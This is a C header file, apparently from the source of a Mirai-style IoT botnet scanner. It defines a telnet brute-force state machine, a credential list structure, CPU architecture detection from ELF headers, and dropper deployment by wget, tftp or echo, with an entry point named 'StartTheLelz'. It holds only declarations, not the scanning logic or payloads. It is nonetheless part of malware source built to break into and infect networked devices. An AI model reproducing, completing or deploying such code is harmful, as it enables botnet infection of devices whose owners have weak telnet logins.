#ifdef TSUNAMI_SCAN
#pragma once

enum
{
	SCANNER_BUF_SIZE = 1024,
	// States
	CONNECTION_SETUP = 0,
	CONNECTION_SELECT = 1,
	TELNET_READ_USER = 2,
	TELNET_READ_PASSWORD = 3,
	TELNET_DETERMINE_SUCCESS = 4,
	TELNET_QUERY = 5,
	TELNET_QUERY_READ = 6,
	TELNET_CHOOSE_DIR = 7,
	TELNET_GET_ARCH = 8,
	TELNET_CHOOSE_METHOD = 9,
	TELNET_BUILD_ECHO_PAYLOAD = 10,
	TELNET_ECHO_READ = 11,
	TELNET_READ_DEPLOY = 12,
	// Prompt IDs
	TELNET_LOGIN_PROMPT = 0,
	TELNET_QUERY_RESPONSE = 1,
	TELNET_SUCCESS_PROMPT = 2,
	TELNET_BAD_PROMPT = 3,
	TELNET_SUCCESS_BAD_PROMPT = 4,
	TELNET_ELF_RESPONSE = 5,
	TELNET_WGET_RESPONSE = 6,
	TELNET_TFTP_RESPONSE = 7,
	TELNET_DEPLOY_RESPONSE = 8,
	TELNET_ECHO_RESPONSE = 9,
	// Misc
	MAX_TELNET_CREDENTIALS = 10,
	MAX_TELNET_ATTEMPTS = 10,
	// Corresponding hexadecimal value for the CPU after the ELF header parse
	EM_NONE = 0,
	EM_SPARC = 2,
	EM_ARM = 40,
	EM_386 = 3,
	EM_68K = 4,
	EM_MIPS = 8,
	EM_PPC = 20,
	EM_X86_64 = 62,
	EM_SH = 42,
	// Little-Big endianness
	ENDIAN_LITTLE = 1,
	ENDIAN_BIG = 2,
	// Bit
	BIT_32 = 1,
	BIT_64 = 2,
	// Misc
	DROPPER_COUNT = 10,
	MAX_ECHO_BYTES = 128,
};

struct dropper
{
	uint8_t bit;
	uint8_t endianness;
	uint8_t machine;
	char *str;
	uint16_t len;
};

struct binary
{
	char *str;
	uint16_t len;
};

struct scan_struct
{
	int fd;
	uint8_t state;
	char buf[SCANNER_BUF_SIZE];
	uint32_t destination_addr;
	uint16_t destination_port;
	uint8_t credential_index;
	uint32_t timeout;
	uint8_t attempts;
	uint8_t complete;
	uint8_t bit;
	uint8_t endianness;
	uint16_t machine;
	char arch[32];
	uint8_t dropper_index;
	uint8_t upload_method;
};

struct credentials
{
	uint8_t len;
	char *str;
};

struct prompts
{
	uint8_t id;
	char *str;
	uint16_t len;
	BOOL d;
	BOOL u;
	struct prompts *next;	
};

void StartTheLelz(void);
void kill_scan(void);
#endif
